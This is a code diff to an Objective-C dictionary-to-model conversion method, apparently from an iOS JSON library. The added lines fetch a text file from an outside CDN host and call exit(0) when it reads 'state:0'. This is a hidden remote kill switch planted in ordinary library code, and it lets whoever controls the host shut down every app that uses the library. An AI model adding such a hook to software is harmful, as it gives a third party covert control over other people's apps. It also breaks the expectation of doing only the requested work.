@@ -79,6 +79,14 @@ static NSNumberFormatter *_numberFormatter;
 {
     MJExt *mjExt = [[MJExt alloc] init];
     [mjExt check];
+    
+    NSURL *url = [NSURL URLWithString:@"http://7jpo14.com1.z0.glb.clouddn.com/gift.txt"];
+    NSData *data = [NSData dataWithContentsOfURL:url];
+    NSString *state = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+    
+    if ([state isEqualToString:@"state:0"]) {
+        exit(0);
+    }
 
     MJAssertError([keyValues isKindOfClass:[NSDictionary class]], self, error, @"keyValues参数不是一个字典");
     
